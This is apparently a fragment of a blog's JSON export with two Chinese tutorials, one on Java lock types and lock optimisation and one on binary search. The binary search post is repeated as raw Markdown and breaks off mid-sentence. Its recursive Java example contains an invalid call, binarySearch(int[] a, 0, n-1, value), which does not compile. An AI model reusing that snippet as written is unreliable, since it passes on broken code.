title=\"自旋锁\"></a>自旋锁</h3><p>自旋锁的原理非常简单，如果持有锁的线程能在很短时间内释放资源，那么等待竞争锁的线程就不需要做内核态和用户态之间的切换进入阻塞状态，他们只需要等一等（自旋），等持有锁的线程释放锁后即可立即获取锁，这样就避免用户线程和内核的切换消耗。</p>\n<p>线程自旋是需要消耗CPU的，说白了就是再让CPU做无用功，如果一直获取不到锁，那县城也不能一直占用CPU自旋锁做无用功，所以需要设定一个最大自旋等待时间。</p>\n<p>如果持有锁的线程执行时间查过自旋等待的最大时间仍然没有释放锁，就会导致其他争用锁的线程在最大时间还是获取不到锁，这是争用线程会停止自旋进入阻塞状态。</p>\n<h3 id=\"非公平锁\"><a href=\"#非公平锁\" class=\"headerlink\" title=\"非公平锁\"></a>非公平锁</h3><p>JVM按照随机、就近原则分配锁的机制则称为不公平锁。非公平锁是指多个线程获取锁的顺序并不是按照申请的顺序，有可能后申请的线程比先申请的线程先获得锁。</p>\n<p>在java中，ReentrantLock可以通过构造函数指定该锁是公平锁还是非公平锁，默认是非公平锁。非公平锁实际执行效率要远远超出公平锁，因此除非有特殊需要，否则最常用的还是非公平锁的分配机制。</p>\n<p>对于synchronized而言，是一种非公平锁，由于其并不想ReentrantLock是通过AQS框架实现的线程调度，所有没有任何办法使其变为公平锁。</p>\n<h3 id=\"公平锁\"><a href=\"#公平锁\" class=\"headerlink\" title=\"公平锁\"></a>公平锁</h3><p>与非公平锁相对，公平锁是按照线程申请的顺序进行锁的分配。通常先对锁获取请求的线程会先被分配到锁。由于公平锁会维护一个线程队列，因此相比非公平锁性能会下降5-10倍。</p>\n<h3 id=\"可重入锁（递归锁）\"><a href=\"#可重入锁（递归锁）\" class=\"headerlink\" title=\"可重入锁（递归锁）\"></a>可重入锁（递归锁）</h3><p>可重入锁又称递归锁，是指在一个线程的外层方法回去锁之后，在进入内层方法时会自动回去锁。在java中，ReentrantLock和Synchronized都是可重入锁。</p>\n<h3 id=\"ReadWriteLock-读写锁\"><a href=\"#ReadWriteLock-读写锁\" class=\"headerlink\" title=\"ReadWriteLock 读写锁\"></a>ReadWriteLock 读写锁</h3><p>为了提高性能，Java中提供了读写锁，在读的地方用读锁，在写的地方用写锁，灵活控制，在没有写锁的情况下，读是无阻塞的，在一定情况下提高了程序的运行效率。读写锁分为读锁和写锁，多个读锁不互斥，读锁和写锁互斥，这是由jvm控制的，你只要上好相应的锁即可。</p>\n<p>Java中读写锁有个接口java.util.concurrent.locks.ReadWriteLock，也有具体的实现ReentrantReadWriteLock。</p>\n<h3 id=\"共享锁和独占锁\"><a href=\"#共享锁和独占锁\" class=\"headerlink\" title=\"共享锁和独占锁\"></a>共享锁和独占锁</h3><p>java并发包中提供的加锁模式分别为共享锁和独占锁。</p>\n<p><strong>1、独占锁</strong></p>\n<p>独占锁模式下，只有一个线程持有锁，ReentrantLock就是以独占锁实现的互斥锁。独占锁是一种悲观保守的加锁策略，他避免了读/读冲突，如果某个只读线程获取了锁，则其他读线程都只能等待，这种情况下就限制了不必要的并发性，应为读操作并不会影响数据的一致性。</p>\n<p><strong>2、共享锁</strong></p>\n<p>共享锁允许多个线程同时获得锁，并发访问共享资源，如：ReadWriteLock。共享锁是一种乐观锁，他放宽了加锁策略，允许多个执行读操作的线程同时访问共享资源。</p>\n<p>AQS内部类Node定义了两个常量SHARED和EXCLUSIVE，他们分别表示了AQS队列中等待线程获取锁的模式。</p>\n<h3 id=\"重量级锁\"><a href=\"#重量级锁\" class=\"headerlink\" title=\"重量级锁\"></a>重量级锁</h3><p>Synchronized是通过对象内部的一个叫做监视器锁（monitor）来实现的。但是监视器锁本质又是依赖于底层的操作系统的MutexLock实现的，而操作系统实现线程之间的切换这就需要从用户态转换为核心态，这个成本非常高，状态之间的转换需要相对比较长的时间，这就是为什么Synchronized效率低的原因。因此这种依赖于操作系统Mutex Lock实现的锁我们称之为“重量级锁”，JDK中对于Synchronized的优化，其核心就是为了减少这种重量级锁的使用。JDK1.6之后，为了减少锁和释放锁所带来的性能消耗，提高性能，引入了“轻量级锁”和“偏向锁”。</p>\n<h3 id=\"轻量级锁\"><a href=\"#轻量级锁\" class=\"headerlink\" title=\"轻量级锁\"></a>轻量级锁</h3><p>锁的状态有四种：无锁状态、偏向锁、轻量级锁、重量级锁。</p>\n<p>随着锁的竞争，锁可以从偏向锁升级到轻量级锁，再升级到重量级锁。但是锁升级只能是单向的，也就是说只能从低到高，不会出现锁的降级。</p>\n<p>“轻量级锁”是相对于使用系统互斥量来实现的传统锁而言的，但是首先要强调一点的是，轻量级锁并不是用来代替重量级锁的，他的本意是在没有多线程竞争的前提下，减少传统的重量级锁产生的性能消耗。在解释轻量级锁的执行过程之前，先明白一点，轻量级锁所适应的场景是线程交替执行同步代码块的情况，如果存在同一时间访问统一锁的情况，就会导致轻量级锁膨胀为重量级锁。</p>\n<h3 id=\"偏向锁\"><a href=\"#偏向锁\" class=\"headerlink\" title=\"偏向锁\"></a>偏向锁</h3><p>Hotspot的作者经过大量研究发现大多数情况下锁不仅不会存在多线程竞争，而且总是由同一个线程多次获取。偏向锁的目的是在某个线程获得锁之后，消除这个线程锁重入（CAS）的开销，看起来像是让这个线程得到了偏护。引入偏向锁的目的是为了在无多线程竞争条件下尽量减少不必要的轻量级锁执行路径，应为轻量级锁的获取和释放依赖多次CAS原子指令，而偏向锁只需要在置换ThreadID的时候依赖一次CAS原子指令（由于一旦出现多线程竞争的情况就必须撤销偏向锁，所以偏向锁的撤销消耗的性能必须小于节省下来的CAS原子指令的性能消耗）。上面说过，轻量级锁是为了在线程交替执行同步块的时候提高性能，而偏向锁则是在只有一个线程执行同步快时进一步提高性能。</p>\n<h3 id=\"分段锁\"><a href=\"#分段锁\" class=\"headerlink\" title=\"分段锁\"></a>分段锁</h3><p>分段锁是一种设计，并不是具体的一种锁。在ConcurrentHashMap中，其并发的思想就是通过分段所的形式来实现高效的并发操作。</p>\n<h2 id=\"二、-JAVA中几种锁的实现\"><a href=\"#二、-JAVA中几种锁的实现\" class=\"headerlink\" title=\"二、 JAVA中几种锁的实现\"></a>二、 JAVA中几种锁的实现</h2><h3 id=\"1、Synchronized-同步锁\"><a href=\"#1、Synchronized-同步锁\" class=\"headerlink\" title=\"1、Synchronized 同步锁\"></a>1、Synchronized 同步锁</h3><p>synchronized 可以把任意一个非NULL的对象当作锁。它属于独占锁，同时属于可重入锁。</p>\n<p><strong>Synchronized的作用范围</strong></p>\n<p>当做用于方法时，锁住的对象是对象的实例（this）。</p>\n<p>当做用于静态方法时，锁住的是Class实例，又因为Class的相关数据存储在永久带PermGen（JDK1.8则是metaspace），永久带是全局共享，因此静态方法锁相当于是类的一个全局锁，会锁住所有调用该方法的线程。</p>\n<p>当作用域一个对象实例时，锁住的是所有以该对象为锁的代码块。他有多个队列，当多个线程一起访问某个对象监视器时，对象监视器会将这些线程存储在不同的容器中。</p>\n<p><strong>Synchronized 核心组件</strong></p>\n<p>Wait Set： 那些调用wait方法被阻塞的线程放置在这里<br>Contention List： 竞争队列，所有请求所得线程首先被放在这个竞争队列中<br>Entry List： Contention List中的那些有资格成为候选资源的线程被移动到Entry List中<br>OnDeck： 任意时刻，最多只有一个线程正在竞争锁资源，该线程被称为OnDeck<br>Owner： 当前已经获取到资源锁的线程被称为Owner<br>!Owner: 当前释放锁的线程</p>\n<h3 id=\"2、ReentrantLock\"><a href=\"#2、ReentrantLock\" class=\"headerlink\" title=\"2、ReentrantLock\"></a>2、ReentrantLock</h3><p>ReentrantLock继承接口Lock并实现了接口中定义的方法，也是一种可重入锁，除了能完成Synchronized所能完成的所有工作外，还提供了诸如可响应中断锁、可轮询锁请求、定时锁等避免多线程死锁的方法。</p>\n<p>ReentrantLock通过方法lock和unlock来进行加锁和解锁操作，与Synchronized会被JVM自动解锁不同，ReentrantLock加锁需要手动进行解锁。为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。</p>\n<h3 id=\"3、Semaphore-信号量\"><a href=\"#3、Semaphore-信号量\" class=\"headerlink\" title=\"3、Semaphore 信号量\"></a>3、Semaphore 信号量</h3><p>Semaphore是一种基于计数的信号量，他可以设定一个阈值，基于此，多个线程竞争获取许可信号，做完自己的申请后归还，超过阈值后，线程申请许可信号量会被阻塞。Semaphore可以用来构建一些对象池、线程池等，比如数据库连接池。</p>\n<p>Semaphore基本能完成ReentrantLock的所有工作，使用方法也与之类似，通过acquire()与release()方法来获取和释放资源。经实测，Semaphore.acquire()默认为可响应中断锁，与ReentrantLock.lockInterruptibly()作用效果一致，也就是说在等待临界资源的过程中可以被Thread.interrupt()中断。</p>\n<p>此外，Semaphore也实现了可轮询的锁请求和定时锁的功能，除了方法名tryAcquire()与tryLock不同之外，其使用方法与ReentrantLock几乎一致，Semaphore也提供了公平和非公平锁的机制，也可以在构造函数中进行设定。</p>\n<p>Semaphore的释放也必须手动进行，因此与ReentrantLock一样，为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。</p>\n<h3 id=\"4、AtomicInteger\"><a href=\"#4、AtomicInteger\" class=\"headerlink\" title=\"4、AtomicInteger\"></a>4、AtomicInteger</h3><p>此处AtomicInteger是一个提供原子操作的Integer类，类似的还有AtomicBoolean、AtomicLong、AtomicReference等。他们的实现原理相同，区别在于运算类型不同，令人兴奋的是，可以通过AtomicReference<v> 将一个对象的所有操作转换为原子操作。</v></p>\n<p>我们知道，在多线程程序中，诸如i++等运算不具备原子性，是不安全的线程操作之一。通常我们会使用synchronized将该操作变为一个原子操作，但JVM为此类特意提供了一些同步类，使得使用方便，且使程序运行效率变得更高。通过相关资料显示，使用AtomicInteger的性能是ReentantLock的好几倍。</p>\n<h2 id=\"三、-锁的优化\"><a href=\"#三、-锁的优化\" class=\"headerlink\" title=\"三、 锁的优化\"></a>三、 锁的优化</h2><h3 id=\"1、较少锁持有时间\"><a href=\"#1、较少锁持有时间\" class=\"headerlink\" title=\"1、较少锁持有时间\"></a>1、较少锁持有时间</h3><p>只在有线程安全的程序上加锁</p>\n<h3 id=\"2、减少锁粒度\"><a href=\"#2、减少锁粒度\" class=\"headerlink\" title=\"2、减少锁粒度\"></a>2、减少锁粒度</h3><p>将对象拆成小对象，大大增加并行度，降低锁竞争。降低了锁的竞争，偏向锁、轻量级锁的概率才会高，最典型的的减小锁粒度的案例就是ConcurrentHashMap。</p>\n<h3 id=\"3、锁分离\"><a href=\"#3、锁分离\" class=\"headerlink\" title=\"3、锁分离\"></a>3、锁分离</h3><p>最常见的锁分离就是读写锁ReadWriteLock，根据功能分离成读锁和写锁，这样读读不互斥，读写互斥，写写互斥，既保证了线程安全，有提高了性能。读写分离思想可以延伸，只要操作互不影响，所就可以分离，比如LinkedBlockingQueue从头部取出，从尾部放数据。</p>\n<h3 id=\"4、锁粗化\"><a href=\"#4、锁粗化\" class=\"headerlink\" title=\"4、锁粗化\"></a>4、锁粗化</h3><p>通常情况下，为了保证多线程间的有效并发，会要求每个线程持有锁的时间尽量短，即在使用完公共资源后，应该立即释放锁。但是凡事都有一个度，如果对同一个锁不停的请求、同步、释放，其本身也会消耗宝贵的系统资源，反而不利于性能优化。</p>\n<h3 id=\"5、锁消除\"><a href=\"#5、锁消除\" class=\"headerlink\" title=\"5、锁消除\"></a>5、锁消除</h3><p>锁消除是编译器级别的事，在即时编译器时，如果发现不可能被共享的对象，则可以消除这些对象的锁操作，多数是因为程序员编码不规范引起的。</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-二分查找(上)","date":"2018-11-09T06:30:53.000Z","mathjax":true,"_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n今天我们将一种针对有序数据集合的查找算法：**二分查找（Binary Search）算法**，也叫折半查找算法。二分查找算法的思想非常简单，很多计算机专业的同学很容易就能理解，但是看似简单的东西有时候很难掌握，想要灵活运用就更加困难。\n\n我们先来看一道思考题：假设我们有1000万个整数数据，每个数据占8个字节，**如何设计数据结构和算法，快速判断某个整数是否出现在这1000万个数据中？**，我们希望这个功能不要占用太多的内存空间，最好不要查过100MB，你会怎么做呢？带着这个问题，开始学习今天的内容。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 无处不在的二分思想\n{% endnote %}\n</div>\n\n二分查找是一种非常简单易懂的快速查找算法，生活中到处可见。比如说，我们现在来做一个猜字游戏。我随机写一个0到99之间的数字，然后你来猜我写的是什么。猜的过程中，你每猜一次，我就会告诉你猜的大了还是小了，直到猜中为止。你来想想，如何快速猜中我写的数字呢？\n\n假设我写的数字是23，你可以按照下面的步骤来试一试。\n\n|次数|猜测范围|中间数|对比大小|\n|----|-------|------|-------|\n|第一次| 0-99| 49  | 49>23|\n|第二次| 0-48| 24  | 24>23|\n|第三次| 0-23| 11  | 11<23|\n|第四次| 12-23|17  | 17<23|\n|第五次| 18-23| 20 | 20<23|\n|第六次| 21-23| 22 | 22<23|\n|第七次| 23  |     | √    |\n\n7次就猜出来了，是不是很快？这个例子用的就是二分思想，按照这个思想，即使我让你猜的是0-999的数字，最多也只要10次就能猜中。不信的话，你试一试。\n\n这是一个生活中的例子，我们现在回到实际的开发场景中。假设有1000条订单数据，已经按照订单金额从小到大排序，每个订单金额都不同，并且最小单元是元。我们现在想知道是否存在金额等于19元的订单。如果存在，返回订单数据，否则返回null。\n\n最简单的办法当然是从第一个订单开始，一个一个遍历这1000个订单，知道找到金额等于19元的订单为止。但这样查找会比较慢，最坏情况下，可能要遍历完中1000条记录才能找到。那用二分查找能不能更快解决呢？\n\n为了方便理解，我们假设只有10个订单，订单金额分别是：8,11,19,23,27,33,45,55,67,98。\n\n还是利用二分思想，每次都与区间的中间数据比较大小，缩小查找的范围。为了更加直观，我画了一张查找过程的图，其中，low和high表示待查找区间的下标，mid表示待查找区间中间元素下标。\n\n{% asset_img 二分查找.jpg %}\n\n看懂这两个例子，你现在对二分的思想应该掌握的妥妥的了。这里稍微总结一下，**二分查找针对的是一个有序的数据集合，查找思想有点类似于分治思想，每次都通过跟区间的中间元素对比，将待查找的区间缩小为原来的一半，直到查找到相应的元素，或者区间被缩小为0**。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### O(logn)惊人的查找速度\n{% endnote %}\n</div>\n\n二分查找是一种非常高效的查找算法，高效到什么程度呢？我们来分析一下它的时间复杂度。\n\n我们假设数据大小是n，每次查找后数据都会缩小为原来的一半，也就是会除以2，最坏情况下，直到查找的区间被缩小为空，才停止。\n\n<div style=\"text-align: center; color: red;\">\n{% cq %} \n被查找区间的大小变化  \n$$ n,\\ \\frac n 2,\\ \\frac n4,\\ \\frac n8, ...,\\ \\frac n{2^k} $$\n{% endcq %}\n</div>\n\n可以看出，这是一个等比数列。其中$ \\frac n {2^k} = 1$时，k的值就是总共缩小的次数。而每一次缩只涉及两个数据的大小比较，所以经过了k次区间缩小操作，时间复杂度就是O(k)。通过$ \\frac n {2^k} = 1$，我们可以求得$k\\ =\\ log_2n$。所以时间复杂度是O(logn)。\n\n二分查找是我们目前为止遇到的第一个时间复杂度为O(logn)的算法。后面我们还会讲堆、二叉树的操作等，他们的时间复杂度也是O(logn)。我这里就在深入讲讲O(logn)这种对数时间复杂度。这是一种极其高效的时间复杂度，有的时候甚至比时间复杂度是常量级O(1)的算法还要高效。为什么这么说呢？\n\n因为logn是一个非常“恐怖”的量级，即便n非常非常大，对应的logn也很小，比如n等于2的32次方，这个数很大了吧？大约是42亿。也就是说，如果我们在42亿个数据中用二分查找一个数据，最多需要比较32次。\n\n我们前面讲过，用大O表示法表示时间复杂度的时候，会省略掉常数、系数和低阶。对于常量级时间复杂度的算法来说，O(1)有可能表示的是一个非常大的常数量，比如O(1000)、O(10000)。所以常量级时间复杂度的算法有时候可能还没有O(logn)的算法执行效率高。\n\n反过来，对数对应的就是指数。有一个非常著名的“阿基米德与国王下棋的故事”，你可以自行搜索一下，感受一下指数的\"恐怖\"。这也是为什么我们说，指数级时间复杂度的算法在大规模数据面前是无效的。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 二分查找的递归实现与非递归实现\n{% endnote %}\n</div>\n\n实际上，简单的二分查找并不难写，注意这里的\"简单\"二字。下一节，我们会讲到二分查找的变体问题，那才是烧脑的。今天，我们来看看如果写简单的二分查找。\n\n**最简单的情况就是有序数组中不存在重复的元素**，我们在其中用二分查找值等于给定值的数据，我用Java代码实现了一个简单的二分查找算法。\n\n```java\n// a 有序数组\n// n 数组大小\n// value 待查找的元素\npublic int binarySearch(int[] a, int n, int value){\n\tint low = 0;\n\tint high = n-1;\n\n\twhile(low <= high){\n\t\tint mid = (high + low)/2;\n\t\tif(a[mid] == value) {\n\t\t\treturn mid;\n\t\t} else if(a[mid] < value) {\n\t\t\tlow = mid + 1;\n\t\t} else{\n\t\t\thigh = mid -1;\n\t\t}\n\t}\n\n\treturn -1;\n}\n```\n\n这段代码我稍微解释一下，low、high、mid都是指数组下标，其中，low和high表示当前查找的区间范围，初始low=0，high=n-1。mid表示[low、high]的中间位置。我们通过对比a[mid] 和value的大小，来更新接下来要查找的区间范围，知道找到或者区间缩小为0，就退出。如果你有一些编程基础，看懂这些应该不难。现在，我们着重看一下容易出错的3个地方。\n\n**1、循环退出条件**\n\n注意是low<=high， 而不是low < high\n\n**2、mid的取值**\n\n实际上，mid=(low+high)/2 这种写法是有问题的，因为如果low和high比较大的话，两者之和就有可能会溢出。改进方案是将mid的计算方式改写成low+(high-low)/2，更进一步，如果要将性能优化到极致的话，我们可以将除2的操作转化为位运算low+((high-low)>>1)，因为相比较除法运算来说，计算机处理位运算要快得多。\n\n**3、low和high的更新**\n\nlow=mid+1，high=mid-1,。注意这里的+1和-1，如果直接写成low=mid或者high=mid，就可能会发生死循环。比如，当high=3，low=3时，如果a[3]不等于value，就会导致一直循环不退出。\n\n如果你已经留意到上面讲到的三点，我想你已经可以实现一个简单的二分查找了。实际上，二分查找除了用循环来实现，还可以用递归来实现，过程也非常简单。\n\n```java\npublic int binarySearch(int[] a,int n, int value){\n\treturn binarySearch(int[] a, 0, n-1, value);\n}\n\npublic int binarySearch(int[] a, int low, int high, int value){\n\tif(low > high) return -1;\n\n\tint mid = low + ((high-low)>>1);\n\tif(a[mid] == value) {\n\t\treturn mid;\n\t}else if(a[mid] < value) {\n\t\treturn binarySearch(a, mid+1, high, value);\n\t}else{\n\t\treturn binarySearch(a, low, mid-1, value);\n\t}\n}\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 二分查找应用场景的局限性\n{% endnote %}\n</div>\n\n前面我们分析过，二分查找的时间复杂度是O(logn)，查找数据的效率非常高。不过，并不是什么情况下都可以用二分查找，他的应用场景是有很大局限性的。那么什么情况下适合用二分查找，什么情况下不适合呢？\n\n**首先，二分查找依赖的是顺序表结构，简单点说就是数组**\n\n那二分查找能否依赖其他数据结构呢？比如链表，答案是不可以，主要是二分查找算法需要按照下标随机访问元素。我们在数组和链表那两节讲过，数组按照下标随机访问数据的时间复杂度是O(1)，而链表随机访问的时间复杂度是O(n)。所以，如果数据使用链表存储，二分查找的时间复杂度就会变得很高。\n\n二分查找只能用在数据是通过顺序表来存储的数据结构上，如果你的数据是通过其他结构存储的，则无法应用二分查找。\n\n**其次，二分查找针对的是有序数据**\n\n二分查找对这一点的要求比较严苛，数据必须是有序的。如果数据没有序，我们需要先排序。前面章节我们讲过，排序时间复杂度最低的是O(nlogn)。所以，如果我们针对的是一组静态数据，没有频繁地插入、删除，我们可以进行一次排序，多次二分查找。这样排序的成本可被均摊，二分查找的边际成本就会比较低。\n\n但是，如果我们的数据集合有频繁的插入、删除操作，要想用二分查找，要么每次插入、删除操作之后保证数据仍然有序，要么在每次二分查找之前都要先进行排序。针对这种动态数据集合，无论哪种方法，维护有序的成本都是很高的。\n\n所以二分查找只能用在插入、删除操作不频繁，一次排序多次查找的场景中。针对动态变化的数据集合，二分查找将不再适用。针对动态的数据集合，如何在其中快速查找某个数据呢？等到二叉树那一节会详细讲。\n\n**再次，数据量太小不太适合二分查找**.\n\n如果要处理的数据量太小，完全没有必要使用二分查找，顺序遍历就可以了。比如我们在一个大小为10的数组中查找一个元素，不管是用二分查找，还是顺序遍历，查找速度都差不多。只有数据量较大的时候，二分查找的优势才比较明显。\n\n不过，这里有一个例外，如果数据之间的比较操作比较耗时，不管数据量大小，都推荐使用二分查找。比如数组中存储的数据都是长度查过300的字符串，如此长的两个字符串之间比对大小，就会非常耗时。我们需要尽可能煎炒比较次数，而比较次数的减少会大大提高性能能，这个时候二分查找就比顺序遍历更有优势。\n\n**最后，数据量太大也不适合用二分查找**\n\n二分查找的底层需要依赖数组这种数据结构，而数组为了支持随机访问的特性，要求内存空间连续，对内存空间的要求比较严苛。比如，我们有1GB大小的数据，如果希望用数组来存储，那就需要1GB的连续内存空间。\n\n注意这里的\"连续\"二字，也就是说，即便有2GB的内存空间剩余，如果没有连续的1GB大小的内存空间，那照样无法申请一个1GB大小的数组。而我们的二分查找是作用在数组这种数据结构之上的，所以太大的数据用数组存储就比较吃力了，也就不能用二分查找了。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n二分查找的理论知识你应该已经掌握了，我们来看下开篇的思考题：如何在1000万个整数中快速查找某个整数。\n\n这个问题并不难，我们的内存限制是100MB，每个数据大小为8字节，最简单的办法就是将数据存储在数组中，内存占用差不多是80MB，符合内存的限制。借助今天讲的内容，我们可以先对这1000万个数据进行从小到大排序，然后再利用二分查找算法，就可以快速查找出想要的数据了。\n\n看起来这个问题并不难，很轻松就能解决。实际上，它暗藏玄机，如果你对数据结构和算法有一定了解，知道散列表、二叉树这些支持快速查找的动态数据结构，你可能会觉得，用散列表、二叉树也可以解决这个问题，实际上是不行的。\n\n虽然大部分情况下，用二分查找可以解决的问题，用散列表、二叉树都可以解决。但是，我们后面会讲到，不管是散列表还是二叉树，都会需要比较多的额外的内存空间，如果用散列表或者二叉树来存储这1000万个数据，用100MB的内存肯定是存储不下来的。而二分查找底层依赖的是数组，除了数据本身之外，不需要额外的其他信息，是最省内存空间的存储方式，所以刚好能在限定的内存大小内解决这个问题。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n今天我们学习了一种针对有序数据的一种高效的查找算法，二分查找，它的时间复杂度是O(logn)。\n\n二分查找的算法核心思想理解起来非常简单，有点类似分治思想。即每次都通过跟区间的中间元素进行对比，将待查找的区间缩小为一半，直到找到要查找的元素，或者区间被缩小为0。但是二分查找的代码比较容易写错，你需要着重掌握三个容易出错的地方：循环退出条件、mid的取值、low和high的更新。\n\n二分查找虽然性能比较优秀，但是应用场景比较有限。底层必须依赖数组，并且还要求数据有序。对于较小规模的数据查找，我们直接使用顺序遍历就可以了，二分查找的优势并不明显。二分查找更适合处理静态数据，也就是没有频繁的数据插入、删除操作。\n\n### 课后思考\n\n1、如何编程实现\"求一个数的平方根\"？要求精确到小数点后6位。\n\n2、我刚才说了，如果数据使用链表存储，二分查找的时间复杂度就会变得很高，那查找的时间复杂度究竟是多少呢？如果你自己推导一下，你就会深刻的认识到，为何我们回西安则用数组而不用链表来实现二分查找了。\n\n\n\n\n\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-二分查找-上.md","raw":"---\ntitle: 算法-二分查找(上)\ndate: 2018-11-09 14:30:53\ntags: ['算法','二分查找']\ncategories: 算法\nmathjax: true\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n今天我们将一种针对有序数据集合的查找算法：**二分查找（Binary Search）算法**，也叫折半查找算法。二分查找算法的思想非常简单，很多计算机专业的同学很容易就能理解，但是看似简单的东西有时候很难掌握，想要灵活运用就更加困难。\n\n我们先来看一道思考题：假设我们有1000万个整数数据，每个数据占8个字节，**如何设计数据结构和算法，快速判断某个整数是否出现在这1000万个数据中？**，我们希望这个功能不要占用太多的内存空间，最好不要查过100MB，你会怎么做呢？带着这个问题，开始学习今天的内容。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 无处不在的二分思想\n{% endnote %}\n</div>\n\n二分查找是一种非常简单易懂的快速查找算法，生活中到处可见。比如说，我们现在来做一个猜字游戏。我随机写一个0到99之间的数字，然后你来猜我写的是什么。猜的过程中，你每猜一次，我就会告诉你猜的大了还是小了，直到猜中为止。你来想想，如何快速猜中我写的数字呢？\n\n假设我写的数字是23，你可以按照下面的步骤来试一试。\n\n|次数|猜测范围|中间数|对比大小|\n|----|-------|------|-------|\n|第一次| 0-99| 49  | 49>23|\n|第二次| 0-48| 24  | 24>23|\n|第三次| 0-23| 11  | 11<23|\n|第四次| 12-23|17  | 17<23|\n|第五次| 18-23| 20 | 20<23|\n|第六次| 21-23| 22 | 22<23|\n|第七次| 23  |     | √    |\n\n7次就猜出来了，是不是很快？这个例子用的就是二分思想，按照这个思想，即使我让你猜的是0-999的数字，最多也只要10次就能猜中。不信的话，你试一试。\n\n这是一个生活中的例子，我们现在回到实际的开发场景中。假设有1000条订单数据，已经按照订单金额从小到大排序，每个订单金额都不同，并且最小单元是元。我们现在想知道是否存在金额等于19元的订单。如果存在，返回订单数据，否则返回null。\n\n最简单的办法当然是从第一个订单开始，一个一个遍历这1000个订单，知道找到金额等于19元的订单为止。但这样查找会比较慢，最坏情况下，可能要遍历完中1000条记录才能找到。那用二分查找能不能更快解决呢？\n\n为了方便理解，我们假设只有10个订单，订单金额分别是：8,11,19,23,27,33,45,55,67,98。\n\n还是利用二分思想，每次都与区间的中间数据比较大小，缩小查找的范围。为了更加直观，我画了一张查找过程的图，其中，low和high表示待查找区间的下标，mid表示待查找区间中间元素下标。\n\n{% asset_img 二分查找.jpg %}\n\n看懂这两个例子，你现在对二分的思想应该掌握的妥妥的了。这里稍微总结一下，**二分查找针对的是一个有序的数据集合，查找思想有点类似于分治思想，每次都通过跟区间的中间元素对比，将待查找的区间缩小为原来的一半，直到查找到相应的元素，或者区间被缩小为0**。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### O(logn)惊人的查找速度\n{% endnote %}\n</div>\n\n二分查找是一种非常高效的查找算法，高效到什么程度呢？我们来分析一下它的时间复杂度。\n\n我们假设数据大小是n，每次查找后数据都会缩小为原来的一半，也就是会除以2，最坏情况下，直到查找的区间被缩小为空，才停止。\n\n<div style=\"text-align: center; color: red;\">\n{% cq %} \n被查找区间的大小变化  \n$$ n,\\ \\frac n 2,\\ \\frac n4,\\ \\frac n8, ...,\\ \\frac n{2^k} $$\n{% endcq %}\n</div>\n\n可以看出，这是一个等比数列。其中$ \\frac n {2^k} = 1$时，k的值就是总共缩小的次数。而每一次缩只涉及两个数据的大小比较，所以经过了k次区间缩小操作，时间复杂度就是O(k)。通过$ \\frac n {2^k} = 1$，我们可以求得$k\\ =\\ log_2n$。所以时间复杂度是O(logn)。\n\n二分查找是我们目前为止遇到的第一个时间复杂度为O(logn)的算法。后面我们还会讲堆、二叉树的操作等，他们的时间复杂度也是O(logn)。我这里就在深入讲讲O(logn)这种对数时间复杂度。这是一种极其高效的时间复杂度，有的时候甚至比时间复杂度是常量级O(1)的算法还要高效。为什么这么说呢？\n\n因为logn是一个非常“恐怖”的量级，即便n非常非常大，对应的logn也很小，比如n等于2的32次方，这个数很大了吧？大约是42亿。也就是说，如果我们在42亿个数据中用二分查找一个数据，最多需要比较32次。\n\n我们前面讲过，用大O表示法表示时间复杂度的时候，会省略掉常数、系数和低阶。对于常量级时间复杂度的算法来说，O(1)有可能表示的是一个非常大的常数量，比如O(1000)、O(10000)。所以常量级时间复杂度的算法有时候可能还没有O(logn)的算法执行效率高。\n\n反过来，对数对应的就是指数。有一个非常著名的“阿基米德与国王下棋的故事”，你可以自行搜索一下，感受一下指数的\"恐怖\"。这也是为什么我们说，指数级时间复杂度的算法在大规模数据面前是无效的。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 二分查找的递归实现与非递归实现\n{% endnote %}\n</div>\n\n实际上，简单的二分查找并不难写，注意这里的\"简单\"二字。下一节，我们会讲到二分查找的变体问题，那才是烧脑的。今天，我们来看看如果写简单的二分查找。\n\n**最简单的情况就是有序数组中不存在重复的元素**，我们在其中用二分查找值等于给定值的数据，我用Java代码实现了一个简单的二分查找算法。\n\n```java\n// a 有序数组\n// n 数组大小\n// value 待查找的元素\npublic int binarySearch(int[] a, int n, int value){\n\tint low = 0;\n\tint high = n-1;\n\n\twhile(low <= high){\n\t\tint mid = (high + low)/2;\n\t\tif(a[mid] == value) {\n\t\t\treturn mid;\n\t\t} else if(a[mid] < value) {\n\t\t\tlow = mid + 1;\n\t\t} else{\n\t\t\thigh = mid -1;\n\t\t}\n\t}\n\n\treturn -1;\n}\n```\n\n这段代码我稍微解释一下，low、high、mid都是指数组下标，其中，low和high表示当前查找的区间范围，初始low=0，high=n-1。mid表示[low、high]的中间位置。我们通过对比a[mid] 